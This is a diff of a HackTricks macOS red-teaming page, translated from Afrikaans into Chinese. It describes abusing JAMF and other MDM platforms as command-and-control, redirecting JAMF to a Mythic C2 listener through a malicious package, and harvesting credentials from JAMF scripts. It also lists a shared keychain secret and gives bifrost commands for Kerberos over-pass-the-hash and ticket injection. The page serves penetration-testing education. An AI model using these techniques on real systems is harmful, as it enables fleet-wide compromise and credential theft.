@@ -1,78 +1,78 @@
 # macOS Red Teaming
 
 {% hint style="success" %}
-Leer & oefen AWS Hacking:<img src="../../.gitbook/assets/arte.png" alt="" data-size="line">[**HackTricks Training AWS Red Team Expert (ARTE)**](https://training.hacktricks.xyz/courses/arte)<img src="../../.gitbook/assets/arte.png" alt="" data-size="line">\
-Leer & oefen GCP Hacking: <img src="../../.gitbook/assets/grte.png" alt="" data-size="line">[**HackTricks Training GCP Red Team Expert (GRTE)**<img src="../../.gitbook/assets/grte.png" alt="" data-size="line">](https://training.hacktricks.xyz/courses/grte)
+学习和实践 AWS 黑客技术：<img src="../../.gitbook/assets/arte.png" alt="" data-size="line">[**HackTricks 培训 AWS 红队专家 (ARTE)**](https://training.hacktricks.xyz/courses/arte)<img src="../../.gitbook/assets/arte.png" alt="" data-size="line">\
+学习和实践 GCP 黑客技术： <img src="../../.gitbook/assets/grte.png" alt="" data-size="line">[**HackTricks 培训 GCP 红队专家 (GRTE)**<img src="../../.gitbook/assets/grte.png" alt="" data-size="line">](https://training.hacktricks.xyz/courses/grte)
 
 <details>
 
-<summary>Ondersteun HackTricks</summary>
+<summary>支持 HackTricks</summary>
 
-* Kyk na die [**subskripsie planne**](https://github.com/sponsors/carlospolop)!
-* **Sluit aan by die** 💬 [**Discord groep**](https://discord.gg/hRep4RUj7f) of die [**telegram groep**](https://t.me/peass) of **volg** ons op **Twitter** 🐦 [**@hacktricks\_live**](https://twitter.com/hacktricks\_live)**.**
-* **Deel hacking truuks deur PRs in te dien na die** [**HackTricks**](https://github.com/carlospolop/hacktricks) en [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github repos.
+* 查看 [**订阅计划**](https://github.com/sponsors/carlospolop)!
+* **加入** 💬 [**Discord 群组**](https://discord.gg/hRep4RUj7f) 或 [**Telegram 群组**](https://t.me/peass) 或 **关注** 我们的 **Twitter** 🐦 [**@hacktricks\_live**](https://twitter.com/hacktricks\_live)**.**
+* **通过向** [**HackTricks**](https://github.com/carlospolop/hacktricks) 和 [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) GitHub 仓库提交 PR 分享黑客技巧。
 
 </details>
 {% endhint %}
 
 <figure><img src="/.gitbook/assets/pentest-tools.svg" alt=""><figcaption></figcaption></figure>
 
-**Kry 'n hacker se perspektief op jou webtoepassings, netwerk, en wolk**
+**从黑客的角度审视您的网络应用、网络和云**
 
-**Vind en rapporteer kritieke, exploiteerbare kwesbaarhede met werklike besigheidsimpak.** Gebruik ons 20+ pasgemaakte gereedskap om die aanvaloppervlak te karteer, vind sekuriteitskwessies wat jou toelaat om bevoegdhede te verhoog, en gebruik geoutomatiseerde eksploitte om noodsaaklike bewyse te versamel, wat jou harde werk in oortuigende verslae omskep.
+**发现并报告具有实际商业影响的关键、可利用的漏洞。** 使用我们 20 多个自定义工具来映射攻击面，查找允许您提升权限的安全问题，并使用自动化利用收集重要证据，将您的辛勤工作转化为有说服力的报告。
 
 {% embed url="https://pentest-tools.com/?utm_term=jul2024&utm_medium=link&utm_source=hacktricks&utm_campaign=spons" %}
 
-## Misbruik van MDM's
+## 滥用 MDM
 
 * JAMF Pro: `jamf checkJSSConnection`
 * Kandji
 
-As jy daarin slaag om **administrateur akrediteer te kompromitteer** om toegang tot die bestuursplatform te verkry, kan jy **potensieel al die rekenaars kompromitteer** deur jou malware in die masjiene te versprei.
+如果您设法 **获取管理员凭据** 以访问管理平台，您可以 **潜在地危害所有计算机**，通过在机器上分发恶意软件。
 
-Vir red teaming in MacOS omgewings is dit hoogs aanbeveel om 'n bietjie begrip te hê van hoe die MDM's werk:
+在 MacOS 环境中进行红队活动，强烈建议对 MDM 的工作原理有一定了解：
 
 {% content-ref url="macos-mdm/" %}
 [macos-mdm](macos-mdm/)
 {% endcontent-ref %}
 
-### Gebruik MDM as 'n C2
+### 将 MDM 用作 C2
 
-'n MDM sal toestemming hê om profiele te installeer, te vra of te verwyder, toepassings te installeer, plaaslike administrateur rekeninge te skep, firmware wagwoord in te stel, die FileVault sleutel te verander...
+MDM 将有权限安装、查询或删除配置文件，安装应用程序，创建本地管理员帐户，设置固件密码，更改 FileVault 密钥...
 
-Om jou eie MDM te laat loop, moet jy **jou CSR deur 'n verskaffer laat teken** wat jy kan probeer om te kry met [**https://mdmcert.download/**](https://mdmcert.download/). En om jou eie MDM vir Apple toestelle te laat loop, kan jy [**MicroMDM**](https://github.com/micromdm/micromdm) gebruik.
+为了运行您自己的 MDM，您需要 **您的 CSR 由供应商签名**，您可以尝试通过 [**https://mdmcert.download/**](https://mdmcert.download/) 获取。要为 Apple 设备运行您自己的 MDM，您可以使用 [**MicroMDM**](https://github.com/micromdm/micromdm)。
 
-Om egter 'n toepassing op 'n geregistreerde toestel te installeer, moet dit steeds deur 'n ontwikkelaar rekening geteken wees... egter, by MDM registrasie voeg die **toestel die SSL sertifikaat van die MDM as 'n vertroude CA** by, so jy kan nou enigiets teken.
+然而，要在注册设备上安装应用程序，您仍然需要它由开发者帐户签名... 然而，在 MDM 注册时，**设备将 MDM 的 SSL 证书添加为受信任的 CA**，因此您现在可以签署任何内容。
 
-Om die toestel in 'n MDM te registreer, moet jy 'n **`mobileconfig`** lêer as root installeer, wat via 'n **pkg** lêer afgelewer kan word (jy kan dit in zip komprimeer en wanneer dit van safari afgelaai word, sal dit uitgepak word).
+要将设备注册到 MDM，您需要以 root 身份安装 **`mobileconfig`** 文件，这可以通过 **pkg** 文件传递（您可以将其压缩为 zip，当从 Safari 下载时将被解压）。
 
-**Mythic agent Orthrus** gebruik hierdie tegniek.
+**Mythic agent Orthrus** 使用了这种技术。
 
-### Misbruik van JAMF PRO
+### 滥用 JAMF PRO
 
-JAMF kan **pasgemaakte skripte** (skripte wat deur die sysadmin ontwikkel is), **natuurlike payloads** (lokale rekening skepping, EFI wagwoord instel, lêer/proses monitering...) en **MDM** (toestel konfigurasies, toestel sertifikate...) uitvoer.
+JAMF 可以运行 **自定义脚本**（由系统管理员开发的脚本）、**本地有效载荷**（本地帐户创建、设置 EFI 密码、文件/进程监控...）和 **MDM**（设备配置、设备证书...）。
 
-#### JAMF self-registrasie
+#### JAMF 自助注册
 
-Gaan na 'n bladsy soos `https://<company-name>.jamfcloud.com/enroll/` om te sien of hulle **self-registrasie geaktiveer** het. As hulle dit het, mag dit **om akrediteer vra**.
+访问 `https://<公司名称>.jamfcloud.com/enroll/` 这样的页面，查看他们是否启用了 **自助注册**。如果启用了，可能会 **要求输入凭据以访问**。
 
-Jy kan die skrip [**JamfSniper.py**](https://github.com/WithSecureLabs/Jamf-Attack-Toolkit/blob/master/JamfSniper.py) gebruik om 'n wagwoord spuit aanval uit te voer.
+您可以使用脚本 [**JamfSniper.py**](https://github.com/WithSecureLabs/Jamf-Attack-Toolkit/blob/master/JamfSniper.py) 执行密码喷洒攻击。
 
-Boonop, nadat jy die regte akrediteer gevind het, kan jy in staat wees om ander gebruikersname met die volgende vorm te brute-force:
+此外，在找到合适的凭据后，您可能能够使用下一个表单暴力破解其他用户名：
 
 ![](<../../.gitbook/assets/image (107).png>)
 
-#### JAMF toestel Verifikasie
+#### JAMF 设备认证
 
 <figure><img src="../../.gitbook/assets/image (167).png" alt=""><figcaption></figcaption></figure>
 
-Die **`jamf`** binêre het die geheim bevat om die sleutelring te open wat op die tyd van die ontdekking **gedeel** was onder almal en dit was: **`jk23ucnq91jfu9aj`**.\
-Boonop, jamf **bly** as 'n **LaunchDaemon** in **`/Library/LaunchAgents/com.jamf.management.agent.plist`**
+**`jamf`** 二进制文件包含打开钥匙串的秘密，在发现时是 **共享** 给所有人的，内容是：**`jk23ucnq91jfu9aj`**。\
+此外，jamf **持久化** 为 **LaunchDaemon** 在 **`/Library/LaunchAgents/com.jamf.management.agent.plist`**
 
-#### JAMF Toestel Oorneming
+#### JAMF 设备接管
 
-Die **JSS** (Jamf Software Server) **URL** wat **`jamf`** sal gebruik, is geleë in **`/Library/Preferences/com.jamfsoftware.jamf.plist`**.\
-Hierdie lêer bevat basies die URL:
+**JSS**（Jamf 软件服务器）**URL** 在 **`/Library/Preferences/com.jamfsoftware.jamf.plist`** 中。\
+该文件基本上包含 URL：
 ```bash
 plutil -convert xml1 -o - /Library/Preferences/com.jamfsoftware.jamf.plist
 
@@ -87,7 +87,7 @@ plutil -convert xml1 -o - /Library/Preferences/com.jamfsoftware.jamf.plist
 ```
 {% endcode %}
 
-So, 'n aanvaller kan 'n kwaadwillige pakket (`pkg`) laat val wat **hierdie lêer oorskryf** wanneer dit geïnstalleer word, wat die **URL na 'n Mythic C2 listener van 'n Typhon agent** stel om nou JAMF as C2 te kan misbruik.
+因此，攻击者可以放置一个恶意包（`pkg`），在安装时**覆盖此文件**，将**URL设置为来自Typhon代理的Mythic C2监听器**，从而能够滥用JAMF作为C2。
 
 {% code overflow="wrap" %}
 ```bash
@@ -98,36 +98,36 @@ sudo jamf policy -id 0
 ```
 {% endcode %}
 
-#### JAMF Imitasie
+#### JAMF 冒充
 
-Om die **kommunikasie** tussen 'n toestel en JMF te **imiteer**, benodig jy:
+为了**冒充设备与 JMF 之间的通信**，你需要：
 
-* Die **UUID** van die toestel: `ioreg -d2 -c IOPlatformExpertDevice | awk -F" '/IOPlatformUUID/{print $(NF-1)}'`
-* Die **JAMF sleutelhouer** van: `/Library/Application\ Support/Jamf/JAMF.keychain` wat die toestel sertifikaat bevat
+* 设备的 **UUID**: `ioreg -d2 -c IOPlatformExpertDevice | awk -F" '/IOPlatformUUID/{print $(NF-1)}'`
+* **JAMF 密钥链**来自: `/Library/Application\ Support/Jamf/JAMF.keychain`，其中包含设备证书
 
-Met hierdie inligting, **skep 'n VM** met die **gestole** Hardeware **UUID** en met **SIP gedeaktiveer**, plaas die **JAMF sleutelhouer,** **haak** die Jamf **agent** en steel sy inligting.
+有了这些信息，**创建一个 VM**，使用**被盗**的硬件 **UUID** 并且**禁用 SIP**，放置 **JAMF 密钥链，** **hook** Jamf **代理**并窃取其信息。
 
-#### Geheimenisse steel
+#### 秘密窃取
 
 <figure><img src="../../.gitbook/assets/image (1025).png" alt=""><figcaption><p>a</p></figcaption></figure>
 
-Jy kan ook die ligging `/Library/Application Support/Jamf/tmp/` monitor vir die **aangepaste skripte** wat admins mag wil uitvoer via Jamf, aangesien hulle **hier geplaas, uitgevoer en verwyder** word. Hierdie skripte **kan akrediteer** bevat.
+你还可以监控位置 `/Library/Application Support/Jamf/tmp/`，以获取管理员可能希望通过 Jamf 执行的 **自定义脚本**，因为它们**在这里放置、执行并删除**。这些脚本**可能包含凭据**。
 
-E however, **akrediteer** mag deur hierdie skripte as **parameters** oorgedra word, so jy sal `ps aux | grep -i jamf` moet monitor (sonder om eers root te wees).
+然而，**凭据**可能作为**参数**传递给这些脚本，因此你需要监控 `ps aux | grep -i jamf`（甚至不需要 root 权限）。
 
-Die skrip [**JamfExplorer.py**](https://github.com/WithSecureLabs/Jamf-Attack-Toolkit/blob/master/JamfExplorer.py) kan luister vir nuwe lêers wat bygevoeg word en nuwe proses argumente.
+脚本 [**JamfExplorer.py**](https://github.com/WithSecureLabs/Jamf-Attack-Toolkit/blob/master/JamfExplorer.py) 可以监听新文件的添加和新进程参数。
 
-### macOS Afgeleë Toegang
+### macOS 远程访问
 
-En ook oor **MacOS** "spesiale" **netwerk** **protokolle**:
+还有关于 **MacOS** "特殊" **网络** **协议**：
 
 {% content-ref url="../macos-security-and-privilege-escalation/macos-protocols.md" %}
 [macos-protocols.md](../macos-security-and-privilege-escalation/macos-protocols.md)
 {% endcontent-ref %}
 
-## Aktiewe Gids
+## 活动目录
 
-In sommige gevalle sal jy vind dat die **MacOS rekenaar aan 'n AD** gekoppel is. In hierdie scenario moet jy probeer om die aktiewe gids te **nommer** soos jy gewoond is. Vind 'n bietjie **hulp** in die volgende bladsye:
+在某些情况下，你会发现 **MacOS 计算机连接到 AD**。在这种情况下，你应该尝试**枚举**活动目录，就像你习惯的那样。在以下页面中找到一些**帮助**：
 
 {% content-ref url="../../network-services-pentesting/pentesting-ldap.md" %}
 [pentesting-ldap.md](../../network-services-pentesting/pentesting-ldap.md)
@@ -141,36 +141,36 @@ In sommige gevalle sal jy vind dat die **MacOS rekenaar aan 'n AD** gekoppel is.
 [pentesting-kerberos-88](../../network-services-pentesting/pentesting-kerberos-88/)
 {% endcontent-ref %}
 
-Sommige **lokale MacOS hulpmiddel** wat jou ook kan help is `dscl`:
+一些**本地 MacOS 工具**也可能对你有帮助，`dscl`：
 ```bash
 dscl "/Active Directory/[Domain]/All Domains" ls /
 ```
-Ook is daar 'n paar gereedskap voorberei vir MacOS om die AD outomaties te enumerate en met kerberos te speel:
+也有一些工具为MacOS准备，以自动枚举AD并与kerberos进行交互：
 
-* [**Machound**](https://github.com/XMCyber/MacHound): MacHound is 'n uitbreiding van die Bloodhound ouditgereedskap wat die versameling en opname van Active Directory verhoudings op MacOS gasheer toestelle moontlik maak.
-* [**Bifrost**](https://github.com/its-a-feature/bifrost): Bifrost is 'n Objective-C projek wat ontwerp is om met die Heimdal krb5 APIs op macOS te kommunikeer. Die doel van die projek is om beter sekuriteitstoetsing rondom Kerberos op macOS toestelle moontlik te maak deur gebruik te maak van inheemse APIs sonder om enige ander raamwerk of pakkette op die teiken te vereis.
-* [**Orchard**](https://github.com/its-a-feature/Orchard): JavaScript for Automation (JXA) gereedskap om Active Directory enumerasie te doen.
+* [**Machound**](https://github.com/XMCyber/MacHound): MacHound是一个扩展Bloodhound审计工具，允许在MacOS主机上收集和摄取Active Directory关系。
+* [**Bifrost**](https://github.com/its-a-feature/bifrost): Bifrost是一个Objective-C项目，旨在与macOS上的Heimdal krb5 API进行交互。该项目的目标是使用本地API在macOS设备上进行更好的Kerberos安全测试，而无需在目标上要求任何其他框架或软件包。
+* [**Orchard**](https://github.com/its-a-feature/Orchard): 用于Active Directory枚举的JavaScript自动化（JXA）工具。
 
-### Domein Inligting
+### 域信息
 ```bash
 echo show com.apple.opendirectoryd.ActiveDirectory | scutil
 ```
-### Users
+### 用户
 
-Die drie tipes MacOS gebruikers is:
+MacOS 用户有三种类型：
 
-* **Plaaslike Gebruikers** — Bestuur deur die plaaslike OpenDirectory diens, hulle is nie op enige manier aan die Active Directory gekoppel nie.
-* **Netwerk Gebruikers** — Vlugtige Active Directory gebruikers wat 'n verbinding met die DC bediener benodig om te autentiseer.
-* **Mobiele Gebruikers** — Active Directory gebruikers met 'n plaaslike rugsteun vir hul akrediteer en lêers.
+* **本地用户** — 由本地 OpenDirectory 服务管理，与 Active Directory 没有任何连接。
+* **网络用户** — 易变的 Active Directory 用户，需要连接到 DC 服务器进行身份验证。
+* **移动用户** — 具有本地备份的 Active Directory 用户，备份其凭据和文件。
 
-Die plaaslike inligting oor gebruikers en groepe word gestoor in die gids _/var/db/dslocal/nodes/Default._\
-Byvoorbeeld, die inligting oor die gebruiker genaamd _mark_ word gestoor in _/var/db/dslocal/nodes/Default/users/mark.plist_ en die inligting oor die groep _admin_ is in _/var/db/dslocal/nodes/Default/groups/admin.plist_.
+关于用户和组的本地信息存储在文件夹 _/var/db/dslocal/nodes/Default._\
+例如，名为 _mark_ 的用户信息存储在 _/var/db/dslocal/nodes/Default/users/mark.plist_ 中，组 _admin_ 的信息存储在 _/var/db/dslocal/nodes/Default/groups/admin.plist_ 中。
 
-Benewens die gebruik van die HasSession en AdminTo kante, **voeg MacHound drie nuwe kante** by die Bloodhound databasis:
+除了使用 HasSession 和 AdminTo 边缘，**MacHound 向 Bloodhound 数据库添加了三个新边缘**：
 
-* **CanSSH** - entiteit toegelaat om SSH na gasheer
-* **CanVNC** - entiteit toegelaat om VNC na gasheer
-* **CanAE** - entiteit toegelaat om AppleEvent skripte op gasheer uit te voer
+* **CanSSH** - 允许 SSH 连接到主机的实体
+* **CanVNC** - 允许 VNC 连接到主机的实体
+* **CanAE** - 允许在主机上执行 AppleEvent 脚本的实体
 ```bash
 #User enumeration
 dscl . ls /Users
@@ -192,24 +192,24 @@ dscl "/Active Directory/TEST/All Domains" read "/Groups/[groupname]"
 #Domain Information
 dsconfigad -show
 ```
-Meer inligting in [https://its-a-feature.github.io/posts/2018/01/Active-Directory-Discovery-with-a-Mac/](https://its-a-feature.github.io/posts/2018/01/Active-Directory-Discovery-with-a-Mac/)
+更多信息请访问 [https://its-a-feature.github.io/posts/2018/01/Active-Directory-Discovery-with-a-Mac/](https://its-a-feature.github.io/posts/2018/01/Active-Directory-Discovery-with-a-Mac/)
 
-### Computer$ wagwoord
+### Computer$ 密码
 
-Kry wagwoorde met:
+使用以下方法获取密码：
 ```bash
 bifrost --action askhash --username [name] --password [password] --domain [domain]
 ```
-Dit is moontlik om die **`Computer$`** wagwoord binne die Stelsel sleutelhouer te verkry.
+可以在系统钥匙串中访问 **`Computer$`** 密码。
 
 ### Over-Pass-The-Hash
 
-Kry 'n TGT vir 'n spesifieke gebruiker en diens:
+获取特定用户和服务的 TGT：
 ```bash
 bifrost --action asktgt --username [user] --domain [domain.com] \
 --hash [hash] --enctype [enctype] --keytab [/path/to/keytab]
 ```
-Sodra die TGT versamel is, is dit moontlik om dit in die huidige sessie in te spuit met:
+一旦收集到 TGT，就可以通过以下方式将其注入当前会话：
 ```bash
 bifrost --action asktgt --username test_lab_admin \
 --hash CF59D3256B62EE655F6430B0F80701EE05A0885B8B52E9C2480154AFA62E78 \
@@ -220,32 +220,32 @@ bifrost --action asktgt --username test_lab_admin \
 bifrost --action asktgs --spn [service] --domain [domain.com] \
 --username [user] --hash [hash] --enctype [enctype]
 ```
-Met verkregen dienskaartjies is dit moontlik om te probeer om toegang te verkry tot gedeeltes op ander rekenaars:
+通过获得的服务票证，可以尝试访问其他计算机上的共享：
 ```bash
 smbutil view //computer.fqdn
 mount -t smbfs //server/folder /local/mount/point
 ```
-## Toegang tot die Sleutelkettie
+## 访问钥匙串
 
-Die Sleutelkettie bevat hoogs waarskynlik sensitiewe inligting wat, indien dit sonder 'n prompt verkry word, kan help om 'n rooi span oefening vorentoe te beweeg:
+钥匙串很可能包含敏感信息，如果在没有生成提示的情况下访问，可能有助于推进红队演练：
 
 {% content-ref url="macos-keychain.md" %}
 [macos-keychain.md](macos-keychain.md)
 {% endcontent-ref %}
 
-## Eksterne Dienste
+## 外部服务
 
-MacOS Rooi Span werk verskillend van 'n gewone Windows Rooi Span, aangesien **MacOS gewoonlik direk met verskeie eksterne platforms geïntegreer is**. 'n Algemene konfigurasie van MacOS is om toegang tot die rekenaar te verkry met **OneLogin gesinkroniseerde akrediteer, en toegang tot verskeie eksterne dienste** (soos github, aws...) via OneLogin.
+MacOS 红队与常规 Windows 红队不同，因为通常 **MacOS 直接与多个外部平台集成**。 MacOS 的常见配置是使用 **OneLogin 同步凭据访问计算机，并通过 OneLogin 访问多个外部服务**（如 github、aws...）。
 
-## Verskeie Rooi Span tegnieke
+## 其他红队技术
 
 ### Safari
 
-Wanneer 'n lêer in Safari afgelaai word, as dit 'n "veilige" lêer is, sal dit **outomaties geopen** word. So byvoorbeeld, as jy **'n zip aflaai**, sal dit outomaties uitgepak word:
+当在 Safari 中下载文件时，如果是“安全”文件，它将 **自动打开**。例如，如果您 **下载一个 zip 文件**，它将自动解压缩：
 
 <figure><img src="../../.gitbook/assets/image (226).png" alt=""><figcaption></figcaption></figure>
 
-## Verwysings
+## 参考资料
 
 * [**https://www.youtube.com/watch?v=IiMladUbL6E**](https://www.youtube.com/watch?v=IiMladUbL6E)
 * [**https://medium.com/xm-cyber/introducing-machound-a-solution-to-macos-active-directory-based-attacks-2a425f0a22b6**](https://medium.com/xm-cyber/introducing-machound-a-solution-to-macos-active-directory-based-attacks-2a425f0a22b6)
@@ -255,23 +255,23 @@ Wanneer 'n lêer in Safari afgelaai word, as dit 'n "veilige" lêer is, sal dit 
 
 <figure><img src="/.gitbook/assets/pentest-tools.svg" alt=""><figcaption></figcaption></figure>
 
-**Kry 'n hacker se perspektief op jou webtoepassings, netwerk, en wolk**
+**获取黑客对您的网络应用程序、网络和云的看法**
 
-**Vind en rapporteer kritieke, exploiteerbare kwesbaarhede met werklike besigheidsimpak.** Gebruik ons 20+ pasgemaakte gereedskap om die aanvaloppervlak te karteer, vind sekuriteitskwessies wat jou toelaat om voorregte te verhoog, en gebruik outomatiese eksploit om noodsaaklike bewyse te versamel, wat jou harde werk in oortuigende verslae omskep.
+**查找并报告具有实际业务影响的关键可利用漏洞。** 使用我们 20 多个自定义工具来映射攻击面，查找让您提升权限的安全问题，并使用自动化利用收集重要证据，将您的辛勤工作转化为有说服力的报告。
 
 {% embed url="https://pentest-tools.com/?utm_term=jul2024&utm_medium=link&utm_source=hacktricks&utm_campaign=spons" %}
 
 {% hint style="success" %}
-Leer & oefen AWS Hacking:<img src="../../.gitbook/assets/arte.png" alt="" data-size="line">[**HackTricks Training AWS Red Team Expert (ARTE)**](https://training.hacktricks.xyz/courses/arte)<img src="../../.gitbook/assets/arte.png" alt="" data-size="line">\
-Leer & oefen GCP Hacking: <img src="../../.gitbook/assets/grte.png" alt="" data-size="line">[**HackTricks Training GCP Red Team Expert (GRTE)**<img src="../../.gitbook/assets/grte.png" alt="" data-size="line">](https://training.hacktricks.xyz/courses/grte)
+学习和实践 AWS 黑客技术：<img src="../../.gitbook/assets/arte.png" alt="" data-size="line">[**HackTricks 培训 AWS 红队专家 (ARTE)**](https://training.hacktricks.xyz/courses/arte)<img src="../../.gitbook/assets/arte.png" alt="" data-size="line">\
+学习和实践 GCP 黑客技术：<img src="../../.gitbook/assets/grte.png" alt="" data-size="line">[**HackTricks 培训 GCP 红队专家 (GRTE)**<img src="../../.gitbook/assets/grte.png" alt="" data-size="line">](https://training.hacktricks.xyz/courses/grte)
 
 <details>
 
-<summary>Ondersteun HackTricks</summary>
+<summary>支持 HackTricks</summary>
 
-* Kyk na die [**subskripsie planne**](https://github.com/sponsors/carlospolop)!
-* **Sluit aan by die** 💬 [**Discord groep**](https://discord.gg/hRep4RUj7f) of die [**telegram groep**](https://t.me/peass) of **volg** ons op **Twitter** 🐦 [**@hacktricks\_live**](https://twitter.com/hacktricks\_live)**.**
-* **Deel hacking truuks deur PRs in te dien na die** [**HackTricks**](https://github.com/carlospolop/hacktricks) en [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github repos.
+* 查看 [**订阅计划**](https://github.com/sponsors/carlospolop)!
+* **加入** 💬 [**Discord 群组**](https://discord.gg/hRep4RUj7f) 或 [**telegram 群组**](https://t.me/peass) 或 **在** **Twitter** 🐦 [**@hacktricks\_live**](https://twitter.com/hacktricks\_live)** 上关注我们。**
+* **通过向** [**HackTricks**](https://github.com/carlospolop/hacktricks) 和 [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github 仓库提交 PR 来分享黑客技巧。
 
 </details>
 {% endhint %}
